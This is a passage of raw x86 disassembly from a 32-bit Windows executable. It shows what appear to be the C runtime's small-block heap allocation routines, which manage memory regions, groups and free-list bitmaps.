  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
